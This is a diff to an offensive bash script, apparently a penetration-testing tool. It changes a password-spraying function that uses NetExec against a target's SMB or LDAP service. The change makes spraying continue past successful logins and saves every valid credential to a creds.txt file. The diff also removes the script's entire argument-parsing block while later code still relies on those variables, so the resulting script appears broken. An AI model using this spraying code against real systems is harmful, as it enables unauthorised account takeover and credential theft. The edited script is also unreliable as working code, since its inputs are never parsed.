@@ -105,111 +105,33 @@ password_spray() {
   local target="$1"
   local users="$2"
   local passwords="$3"
+  local creds_file="$BASE_DIR/creds.txt"
   
   echo -e "${GREEN}[INFO]${RESET} Checking available authentication services on $target..."
   
   if check_port "$target" 445; then
     echo -e "${GREEN}[INFO]${RESET} SMB (port 445) is open. Using SMB for authentication attempts."
     if [[ -n "$users" && -n "$passwords" ]]; then
-      nxc smb "$target" -u "$users" -p "$passwords" | grep [+]
+      nxc smb "$target" -u "$users" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
     elif [[ -n "$users" ]]; then
-      nxc smb "$target" -u "$users" -p "$PASSWORD" | grep [+]
+      nxc smb "$target" -u "$users" -p "$PASSWORD" --continue-on-success | grep [+] | tee -a "$creds_file"
     elif [[ -n "$passwords" ]]; then
-      nxc smb "$target" -u "$USERNAME" -p "$passwords" | grep [+]
+      nxc smb "$target" -u "$USERNAME" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
     fi
   elif check_port "$target" 389; then
     echo -e "${GREEN}[INFO]${RESET} LDAP (port 389) is open. Using LDAP for authentication attempts."
     if [[ -n "$users" && -n "$passwords" ]]; then
-      nxc ldap "$target" -u "$users" -p "$passwords" | grep [+]
+      nxc ldap "$target" -u "$users" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
     elif [[ -n "$users" ]]; then
-      nxc ldap "$target" -u "$users" -p "$PASSWORD" | grep [+]
+      nxc ldap "$target" -u "$users" -p "$PASSWORD" --continue-on-success | grep [+] | tee -a "$creds_file"
     elif [[ -n "$passwords" ]]; then
-      nxc ldap "$target" -u "$USERNAME" -p "$passwords" | grep [+]
+      nxc ldap "$target" -u "$USERNAME" -p "$passwords" --continue-on-success | grep [+] | tee -a "$creds_file"
     fi
   else
     echo -e "${RED}[ERROR]${RESET} Neither SMB (445) nor LDAP (389) is open on $target. Skipping password spraying."
     return 1
   fi
 }
-
-# Ensure arguments are provided
-if [[ "$#" -eq 0 ]]; then
-  usage
-fi
-
-# Parse command-line arguments
-TARGET=""
-USERNAME=""
-PASSWORD=""
-NTLM_HASH=""
-KERBEROS=false
-NO_PASS=false
-LOCAL_AUTH=false
-NO_RECON=false
-REPORT_FORMAT=""
-VERBOSE=false
-SPRAY_USERS=""
-SPRAY_PASSWORDS=""
-
-while [[ "$#" -gt 0 ]]; do
-  case "$1" in
-    -t|--target)
-      TARGET="$2"
-      shift 2
-      ;;
-    -u|--user)
-      USERNAME="$2"
-      shift 2
-      ;;
-    -p|--pass)
-      PASSWORD="$2"
-      shift 2
-      ;;
-    -H|--hash)
-      NTLM_HASH="$2"
-      shift 2
-      ;;
-    -k|--kerberos)
-      KERBEROS=true
-      shift
-      ;;
-    --no-pass)
-      NO_PASS=true
-      shift
-      ;;
-    --local-auth)
-      LOCAL_AUTH=true
-      shift
-      ;;
-    --spray-users)
-      SPRAY_USERS="$2"
-      shift 2
-      ;;
-    --spray-passwords)
-      SPRAY_PASSWORDS="$2"
-      shift 2
-      ;;
-    --no-recon)
-      NO_RECON=true
-      shift
-      ;;
-    --report)
-      REPORT_FORMAT="$2"
-      shift 2
-      ;;
-    -v|--verbose)
-      VERBOSE=true
-      shift
-      ;;
-    -h|--help)
-      usage
-      ;;
-    *)
-      echo -e "${RED}[ERROR]${RESET} Unknown option: $1"
-      usage
-      ;;
-  esac
-done
 
 # Ensure a target is provided
 if [[ -z "$TARGET" ]]; then
